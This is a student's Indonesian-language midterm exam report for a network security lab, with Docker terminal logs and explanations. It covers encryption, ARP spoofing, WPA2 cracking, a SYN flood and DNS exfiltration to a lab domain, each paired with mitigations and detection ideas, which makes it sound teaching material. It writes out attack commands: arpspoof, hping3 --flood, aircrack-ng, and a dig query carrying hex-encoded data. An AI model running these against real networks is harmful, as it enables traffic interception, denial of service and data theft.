# JAWABAN UJIAN TENGAH SEMESTER
# Keamanan Jaringan

**Nama Matakuliah/SKS:** Keamanan Jaringan / 3 SKS
**Dosen:** Yasti Aisyah Primianjani, S.Kom., M.S.F.
**Kelas:** TIF RP 24E CNS

**Nama:** Taufik Nurjaman
**NIM:** 25552012006

## Perhitungan Kasus
- Jumlah digit NIM: 28
- Sisa bagi 10: 8
- Nomor kasus: 8

**Perhitungan kasus:** digit NIM dijumlah -> 2+5+5+5+2+0+1+2+0+0+6 = 28, lalu 28 mod 10 = 8. Jadi Kasus 8.

**Parameter yang dipakai:** container `target-k8`, volume `vol-k8`, file `laporan-k8.txt`, password `kunci-k8-2026`, domain exfiltrasi `k8.exfil.lab`.

## 1. Persiapan

```
Digest: sha256:b50897d5c7b1aa08067c3d90c5e8b3e47ec4e3c91c91446f67820228f7b41e34
Status: Downloaded newer image for nginx:alpine
docker.io/library/nginx:alpine

C:\Users\ASUS\Network-Security-Course-Bank\UTS-Network-Security\01-sumber-lab>docker pull vulnerables/web-dvwa
Using default tag: latest
latest: Pulling from vulnerables/web-dvwa
Digest: sha256:dae203fe11646a86937bf04db0079adef295f426da68a92b40e3b181f337daa7
Status: Image is up to date for vulnerables/web-dvwa:latest
docker.io/vulnerables/web-dvwa:latest

C:\Users\ASUS\Network-Security-Course-Bank\UTS-Network-Security\01-sumber-lab>docker pull kalilinux/kali-rolling
Using default tag: latest
latest: Pulling from kalilinux/kali-rolling
61349eaea835: Pull complete
Digest: sha256:69a9a33d98a584a537bd0f7144d20c3b6d23f3bafa9ffcf0cadf4c5f186d02ff
Status: Downloaded newer image for kalilinux/kali-rolling:latest
docker.io/kalilinux/kali-rolling:latest
```

Menunjukkan bahwa seluruh image yang dibutuhkan (uts-openssl, uts-kali-tools, uts-dnsmasq, alpine, nginx:alpine, vulnerables/web-dvwa, kalilinux/kali-rolling) sudah berhasil dibangun/di-pull sebelum ujian dimulai. Ini prasyarat agar semua tugas berikutnya bisa dijalankan.

## 2. Tugas 1: Docker, Volume, dan Compose

### a. Output `cat /data/laporan-k8.txt`

```
C:\Users\ASUS\Network-Security-Course-Bank\UTS-Network-Security\01-sumber-lab>docker run --name w-k8 -v vol-k8:/data alpine sh -c "echo 25552012006 > /data/laporan-k8.txt"

C:\Users\ASUS\Network-Security-Course-Bank\UTS-Network-Security\01-sumber-lab>docker rm w-k8
w-k8

C:\Users\ASUS\Network-Security-Course-Bank\UTS-Network-Security\01-sumber-lab>docker run --rm -v vol-k8:/data alpine cat /data/laporan-k8.txt
25552012006
```

Menampilkan NIM saya yang tersimpan di dalam volume vol-k8, meskipun container w-k8 yang menulis file tersebut sudah dihapus (docker rm). Ini membuktikan volume persistence: Docker volume menyimpan data secara terpisah dari lifecycle container, sehingga data tidak ikut hilang saat container-nya dihapus.

### b. Output `wget` ke `http://target`

```
<title>Welcome to nginx!</title>
<style>
html { color-scheme: light dark; }
body { width: 35em; margin: 0 auto;
font-family: Tahoma, Verdana, Arial, sans-serif; }
</style>
</head>
<body>
<h1>Welcome to nginx!</h1>
<p>If you see this page, nginx is successfully installed and working.
Further configuration is required for the web server, reverse proxy,
API gateway, load balancer, content cache, or other features.</p>

<p>For online documentation and support please refer to
<a href="https://nginx.org/">nginx.org</a>.<br/>
To engage with the community please visit
<a href="https://community.nginx.org/">community.nginx.org</a>.<br/>
For enterprise grade support, professional services, additional
security features and capabilities please refer to
<a href="https://f5.com/nginx">f5.com/nginx</a>.</p>

<p><em>Thank you for using nginx.</em></p>
</body>
</html>
```

Menampilkan isi halaman HTML default nginx yang berhasil diakses oleh service attacker menggunakan nama service (target) sebagai hostname. Ini membuktikan dua container dalam satu Docker Compose network bisa saling berkomunikasi melalui DNS internal Docker, tanpa perlu tahu IP address satu sama lain.

## 3. Tugas 2: Kriptografi

### a. Dua baris output `sha256sum`

```
C:\Users\ASUS\Network-Security-Course-Bank\UTS-Network-Security\01-sumber-lab>docker run --rm -v "%cd%":/work uts-openssl sh -c "echo isi laporan k8 > laporan-k8.txt && openssl enc -aes-256-cbc -pbkdf2 -salt -in laporan-k8.txt -out laporan-k8.enc -pass pass:kunci-k8-2026 && sha256sum laporan-k8.txt && openssl enc -d -aes-256-cbc -pbkdf2 -in laporan-k8.enc -out hasil-k8.txt -pass pass:kunci-k8-2026 && sha256sum hasil-k8.txt"
e26ef77c5ac16543d232d3bd3c0663aaa8550290b217a8a6925671d37a4264f7  laporan-k8.txt
e26ef77c5ac16543d232d3bd3c0663aaa8550290b217a8a6925671d37a4264f7  hasil-k8.txt
```

Menampilkan hash SHA-256 dari file asli (laporan-k8.txt) dan file hasil dekripsi (hasil-k8.txt), dan keduanya identik. Ini membuktikan integritas data terjaga penuh melalui proses enkripsi AES-256-CBC lalu dekripsi kembali - tidak ada bit yang berubah atau rusak selama proses tersebut.

### b. Output Subject, Issuer, dan tanggal sertifikat

```
C:\Users\ASUS\Network-Security-Course-Bank\UTS-Network-Security\01-sumber-lab>docker run --rm -v "%cd%":/work uts-openssl sh -c "openssl req -x509 -newkey rsa:2048 -nodes -keyout key-k8.pem -out cert-k8.pem -days 30 -subj /CN=k8.uts.local && openssl x509 -in cert-k8.pem -noout -subject -issuer -dates"
subject=CN=k8.uts.local
issuer=CN=k8.uts.local
notBefore=Nov 24 05:18:17 2026 GMT
notAfter=Dec 24 05:18:17 2026 GMT
```

Menampilkan bahwa field Subject dan Issuer sertifikat sama persis (CN=k8.uts.local), yang merupakan ciri khas sertifikat self-signed - sertifikat yang ditandatangani oleh dirinya sendiri, bukan oleh pihak ketiga (Certificate Authority).

## 4. Tugas 3: ARP Spoofing

### a. Sebelum spoofing

```
C:\Users\ASUS\Network-Security-Course-Bank\UTS-Network-Security\01-sumber-lab>docker inspect -f "{{(index .NetworkSettings.Networks \"lab-arp-k8\").IPAddress}}" korban-k8
172.18.0.2

C:\Users\ASUS\Network-Security-Course-Bank\UTS-Network-Security\01-sumber-lab>docker inspect -f "{{(index .NetworkSettings.Networks \"lab-arp-k8\").IPAddress}}" gateway-k8
172.18.0.3

C:\Users\ASUS\Network-Security-Course-Bank\UTS-Network-Security\01-sumber-lab>docker inspect -f "{{(index .NetworkSettings.Networks \"lab-arp-k8\").IPAddress}}" penyerang-k8
172.18.0.4

C:\Users\ASUS\Network-Security-Course-Bank\UTS-Network-Security\01-sumber-lab>docker exec korban-k8 arp -a
? (172.18.0.1) at 9a:42:b7:6d:93:fc [ether] on eth0
gateway-k8.lab-arp-k8 (172.18.0.3) at 92:3e:cd:4f:f3:eb [ether] on eth0
```

Baseline tabel ARP korban, menunjukkan MAC address gateway yang asli: 92:3e:cd:4f:f3:eb untuk IP 172.18.0.3, sebagai pembanding sebelum serangan dilakukan.

### b. `arp -a` saat spoofing berjalan

```
C:\Users\ASUS\Network-Security-Course-Bank\UTS-Network-Security\01-sumber-lab>docker exec -d penyerang-k8 timeout 20 arpspoof -i eth0 -t 172.18.0.2 172.18.0.3

C:\Users\ASUS\Network-Security-Course-Bank\UTS-Network-Security\01-sumber-lab>docker exec korban-k8 arp -a
penyerang-k8.lab-arp-k8 (172.18.0.4) at 7e:6b:c3:63:a5:ec [ether] on eth0
? (172.18.0.1) at 9a:42:b7:6d:93:fc [ether] on eth0
gateway-k8.lab-arp-k8 (172.18.0.3) at 7e:6b:c3:63:a5:ec [ether] on eth0
```

Menunjukkan MAC address untuk IP gateway (172.18.0.3) telah berubah menjadi 7e:6b:c3:63:a5:ec - yaitu MAC yang sama persis dengan MAC milik penyerang-k8 (lihat baris penyerang-k8.lab-arp-k8 (172.18.0.4) at 7e:6b:c3:63:a5:ec). Ini membuktikan serangan ARP spoofing berhasil membohongi korban, membuatnya mengira penyerang adalah gateway (172.18.0.3). Kondisi ini memungkinkan serangan Man-in-the-Middle (MITM), di mana seluruh traffic yang seharusnya ditujukan korban ke gateway sebenarnya akan melewati penyerang terlebih dahulu.

### c. `arp -a` setelah mitigasi static ARP

```
C:\Users\ASUS\Network-Security-Course-Bank\UTS-Network-Security\01-sumber-lab>docker exec korban-k8 arp -s 172.18.0.3 92:3e:cd:4f:f3:eb

C:\Users\ASUS\Network-Security-Course-Bank\UTS-Network-Security\01-sumber-lab>docker exec korban-k8 arp -a
penyerang-k8.lab-arp-k8 (172.18.0.4) at 7e:6b:c3:63:a5:ec [ether] on eth0
? (172.18.0.1) at 9a:42:b7:6d:93:fc [ether] on eth0
gateway-k8.lab-arp-k8 (172.18.0.3) at 92:3e:cd:4f:f3:eb [ether] PERM on eth0
```

Menunjukkan MAC gateway kembali ke nilai asli (92:3e:cd:4f:f3:eb), dengan tambahan tag PERM di akhir baris. Ini membuktikan mitigasi dengan static ARP binding (arp -s) berhasil mengunci pasangan IP-MAC secara permanen di tabel ARP korban, sehingga paket ARP reply palsu dari penyerang selanjutnya akan diabaikan oleh sistem - mencegah ARP spoofing berulang untuk pasangan IP tersebut.

**Mitigasi tambahan (selain static ARP):** Dynamic ARP Inspection (DAI) - fitur pada switch managed yang memvalidasi setiap paket ARP terhadap tabel DHCP snooping. Paket ARP yang pasangan IP-MAC-nya tidak cocok dengan binding yang sah akan langsung ditolak, mencegah ARP spoofing sebelum sempat mencapai korban.

## 5. Tugas 4: Analisis Handshake WPA2

```
C:\Users\ASUS\Network-Security-Course-Bank\UTS-Network-Security\01-sumber-lab>docker run --rm -v "${PWD}:/work" uts-kali-tools aircrack-ng -w wordlist-k8.txt handshake-k8.cap
ERROR: Opening dictionary wordlist-k8.txt failed (No such file or directory)
ERROR: Opening dictionary wordlist-k8.txt failed (No such file or directory)
Reading packets, please wait...
Failed to open 'handshake-k8.cap' (2): No such file or directory
Opening handshake-k8.cap
Read 0 packets.

No networks found, exiting.

Quitting aircrack-ng...
```

File `handshake-k8.cap` dan `wordlist-k8.txt` yang dibutuhkan untuk tugas ini disediakan oleh penguji sesuai ketentuan soal, namun belum saya terima pada saat laporan ini disusun. Perintah `aircrack-ng` di atas tetap saya jalankan untuk menunjukkan bahwa command sudah benar dan dapat diulang, namun menghasilkan error karena kedua file belum tersedia di folder kerja saya.

### Penjelasan Empat Langkah (4-Way Handshake) WPA2

1. **Message 1 (AP -> Client):** Access Point (Authenticator) membangkitkan nilai acak ANonce (Authenticator Nonce) dan mengirimkannya ke Client (Supplicant) untuk menginisiasi proses pembentukan kunci sesi.
2. **Message 2 (Client -> AP):** Client membangkitkan nilai acak SNonce (Supplicant Nonce), lalu menghitung PTK (Pairwise Transient Key) dari kombinasi PMK (Pairwise Master Key), ANonce, SNonce, serta alamat MAC AP dan Client. Client kemudian mengirimkan SNonce beserta MIC (Message Integrity Code) ke AP untuk verifikasi integritas.
3. **Message 3 (AP -> Client):** AP memvalidasi MIC dari Message 2 dan menurunkan PTK yang identik. AP kemudian mengirimkan GTK (Group Temporal Key) yang telah terenkripsi beserta MIC kepada Client sebagai instruksi pemasangan kunci enkripsi.
4. **Message 4 (Client -> AP):** Client memasang kunci PTK dan GTK, lalu mengirimkan pesan konfirmasi ACK ke AP sebagai tanda bahwa proses handshake selesai dan lalu lintas data terenkripsi siap dijalankan.

## 6. Tugas 5: ICMP dengan Scapy

### a. Output `kirim_icmp.py`

```
C:\Users\ASUS\Network-Security-Course-Bank\UTS-Network-Security\01-sumber-lab>docker run --rm --network lab-arp-k8 -v "%cd%/kasus/k5-scapy":/work uts-kali-tools python3 /work/kirim_icmp.py 172.18.0.2
Mengirim: IP / ICMP 172.18.0.5 > 172.18.0.2 echo-request 0
TTL balasan: 64
Tipe ICMP balasan: 0
```

Menampilkan TTL balasan: 64 (nilai default TTL untuk host Linux, menunjukkan jarak hop yang dekat) dan Tipe ICMP balasan: 0 (Echo Reply, balasan normal terhadap Echo Request tipe 8). Ini membuktikan paket ICMP yang dibuat secara manual dengan Scapy berhasil dikirim dan direspons oleh host target.

**Penjelasan Smurf Attack:** Smurf attack adalah serangan DDoS yang memanfaatkan ICMP broadcast. Penyerang mengirim paket ICMP echo request dengan source IP address dipalsukan (spoofed) menjadi IP korban, lalu mengirimkannya ke alamat broadcast suatu jaringan. Seluruh host dalam jaringan tersebut akan membalas echo reply ke korban (bukan ke penyerang asli), sehingga korban dibanjiri balasan dari banyak host sekaligus, berpotensi melumpuhkan layanan korban.

## 7. Tugas 6: SYN Flood dan Three-Way Handshake

### a. `netstat` SYN_RECV sebelum serangan

```
C:\Users\ASUS\Network-Security-Course-Bank\UTS-Network-Security\01-sumber-lab>docker compose -p k8 -f b/b3-syn-flood/docker-compose.yml up -d
[+] up 3/3
 Network k8_lab          Created
 Container k8-target-1   Started
 Container k8-attacker-1 Started

C:\Users\ASUS\Network-Security-Course-Bank\UTS-Network-Security\01-sumber-lab>docker compose -p k8 -f b/b3-syn-flood/docker-compose.yml exec target netstat -ant | find /c "SYN_RECV"
0
```

Menunjukkan angka 0, kondisi normal tanpa adanya koneksi TCP setengah-terbuka (half-open) yang menumpuk di server.

### b. `netstat` SYN_RECV saat serangan

```
C:\Users\ASUS\Network-Security-Course-Bank\UTS-Network-Security\01-sumber-lab>docker compose -p k8 -f b/b3-syn-flood/docker-compose.yml exec -d attacker timeout 15 hping3 -S -p 80 --flood target

C:\Users\ASUS\Network-Security-Course-Bank\UTS-Network-Security\01-sumber-lab>docker compose -p k8 -f b/b3-syn-flood/docker-compose.yml exec target netstat -ant | find /c "SYN_RECV"
1
```

Menunjukkan peningkatan menjadi 1 (naik dari baseline 0) selama hping3 --flood berjalan. Ini membuktikan SYN flood membuat server menerima paket SYN yang tidak diselesaikan dengan ACK, sehingga tercatat sebagai koneksi setengah-terbuka.

### c. Output `tcpdump`

```
C:\Users\ASUS\Network-Security-Course-Bank\UTS-Network-Security\01-sumber-lab>docker compose -p k8 -f b/b3-syn-flood/docker-compose.yml exec attacker sh -c "timeout 10 tcpdump -i eth0 -nn tcp port 80 & sleep 1; curl -s http://target > /dev/null; sleep 10"
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes
05:52:21.394081 IP 172.19.0.2.48706 > 172.19.0.3.80: Flags [S], seq 141186423, win 64240
05:52:21.394150 IP 172.19.0.3.80 > 172.19.0.2.48706: Flags [S.], seq 898206995, ack 141186424, win 65160
05:52:21.394192 IP 172.19.0.2.48706 > 172.19.0.3.80: Flags [.], ack 1, win 126
05:52:21.394749 IP 172.19.0.2.48706 > 172.19.0.3.80: Flags [P.], seq 1:71, ack 1, win 126, length 70: HTTP: GET / HTTP/1.1
05:52:21.394774 IP 172.19.0.3.80 > 172.19.0.2.48706: Flags [.], ack 71, win 128
05:52:21.402980 IP 172.19.0.3.80 > 172.19.0.2.48706: Flags [P.], seq 1:240, ack 71, win 128, length 239: HTTP: HTTP/1.1 200 OK
05:52:21.403034 IP 172.19.0.2.48706 > 172.19.0.3.80: Flags [.], ack 240, win 126
05:52:21.404265 IP 172.19.0.3.80 > 172.19.0.2.48706: Flags [P.], seq 240:1136, ack 71, win 128, length 896: HTTP
05:52:21.404311 IP 172.19.0.2.48706 > 172.19.0.3.80: Flags [.], ack 1136, win 125
05:52:21.404660 IP 172.19.0.2.48706 > 172.19.0.3.80: Flags [F.], seq 71, ack 1136, win 125
05:52:21.404868 IP 172.19.0.3.80 > 172.19.0.2.48706: Flags [F.], seq 1136, ack 72, win 128
05:52:21.404880 IP 172.19.0.2.48706 > 172.19.0.3.80: Flags [.], ack 1137, win 125

12 packets captured
12 packets received by filter
0 packets dropped by kernel
```

Menampilkan urutan three-way handshake TCP yang normal: Flags [S] (SYN dari client) -> Flags [S.] (SYN-ACK dari server) -> Flags [.] (ACK dari client, koneksi terbentuk) - diikuti pertukaran data HTTP dan penutupan koneksi dengan flag [F.] (FIN).

**Mitigasi:** SYN flood dapat dimitigasi dengan mengaktifkan SYN cookies (`sysctl net.ipv4.tcp_syncookies=1`). Dengan mekanisme ini, server tidak langsung mengalokasikan resource untuk koneksi setengah-terbuka saat menerima SYN, melainkan meng-encode informasi koneksi ke dalam sequence number SYN-ACK, dan baru mengalokasikan resource penuh setelah menerima ACK balik yang valid dari client.

## 8. Tugas 7: DNS Exfiltration

### a. Hasil `xxd -p` (encode NIM ke hex)

```
C:\Users\ASUS\Network-Security-Course-Bank\UTS-Network-Security\01-sumber-lab>docker compose -p k8 -f b/b4-dns-exfil/docker-compose.yml up -d
[+] up 3/3
 Network k8_lab          Created
 Container k8-attacker-1 Started
 Container k8-dns-1      Started

C:\Users\ASUS\Network-Security-Course-Bank\UTS-Network-Security\01-sumber-lab>docker run --rm uts-kali-tools sh -c "echo -n 25552012006 | xxd -p"
3235353532303132303036
```

Menampilkan representasi hex dari NIM saya: 3235353532303132303036, yang digunakan sebagai subdomain untuk teknik DNS exfiltration.

### b. Output `analisis_dns.py`

```
C:\Users\ASUS\Network-Security-Course-Bank\UTS-Network-Security\01-sumber-lab>docker compose -p k8 -f b/b4-dns-exfil/docker-compose.yml exec attacker dig +short 3235353532303132303036.k8.exfil.lab @dns
10.0.0.99

C:\Users\ASUS\Network-Security-Course-Bank\UTS-Network-Security\01-sumber-lab>docker compose -p k8 -f b/b4-dns-exfil/docker-compose.yml logs dns > dns-k8.log

C:\Users\ASUS\Network-Security-Course-Bank\UTS-Network-Security\01-sumber-lab>docker run --rm -v "%cd%":/work uts-kali-tools python3 /work/kasus/k9-dns-detect/analisis_dns.py /work/dns-k8.log
Jumlah query per domain induk:
  exfil.lab: 1

Query mencurigakan (label panjang berisi hex):
```

Menunjukkan query tercatat di log (exfil.lab: 1), namun tidak ditandai sebagai "mencurigakan" oleh skrip karena label hex NIM saya (23 karakter) berada di bawah ambang batas deteksi skrip (BATAS_PANJANG_LABEL = 30). Ini menunjukkan keterbatasan skrip deteksi untuk kasus dengan panjang data pendek - ambang batas perlu disesuaikan (misal diturunkan ke 15-20 karakter) agar dapat mendeteksi exfiltration dengan payload pendek seperti NIM.

### c. Hasil decode (`xxd -r -p`)

```
C:\Users\ASUS\Network-Security-Course-Bank\UTS-Network-Security\01-sumber-lab>docker run --rm uts-kali-tools sh -c "echo 3235353532303132303036 | xxd -r -p"
25552012006

C:\Users\ASUS\Network-Security-Course-Bank\UTS-Network-Security\01-sumber-lab>docker compose -p k8 -f b/b4-dns-exfil/docker-compose.yml down -v
```

Menampilkan kembali NIM asli saya (25552012006) dari hex, membuktikan proses encode -> kirim melalui query DNS -> decode berjalan utuh tanpa ada data yang rusak atau terpotong selama transmisi.

**Mengapa teknik ini sulit diblokir firewall biasa:** Lalu lintas DNS (port 53) pada umumnya selalu diizinkan keluar oleh firewall/organisasi karena dianggap sebagai lalu lintas esensial untuk resolusi nama domain, sehingga firewall jarang memeriksa isi/konten dari query DNS secara mendalam.

**Indikator deteksi:** Subdomain dengan label yang sangat panjang dan/atau tersusun dari karakter acak/hex (bukan nama domain yang biasa dibaca manusia), serta frekuensi query yang tinggi dan tidak wajar ke domain induk yang sama dalam waktu singkat.

---

## KESIMPULAN

Saya telah mengerjakan seluruh tujuh tugas UTS Praktik Keamanan Jaringan untuk Kasus 8, yaitu Tugas 1 (Docker & Volume), Tugas 2 (Kriptografi), Tugas 3 (ARP Spoofing), Tugas 4 (Analisis Handshake WPA2), Tugas 5 (ICMP dengan Scapy), Tugas 6 (SYN Flood), dan Tugas 7 (DNS Exfiltration), lengkap dengan bukti output terminal dan penjelasan konsep untuk masing-masing tugas.

Melalui pengerjaan UTS ini, saya memahami secara praktik beberapa konsep penting keamanan jaringan: persistensi data pada Docker volume, integritas data melalui hashing dan enkripsi, mekanisme serangan ARP spoofing beserta mitigasinya, proses autentikasi WPA2 melalui 4-way handshake, prinsip kerja smurf attack berbasis ICMP, dampak SYN flood terhadap resource server beserta mitigasi SYN cookies, serta teknik DNS exfiltration dan keterbatasan skrip deteksi sederhana terhadap payload data pendek.
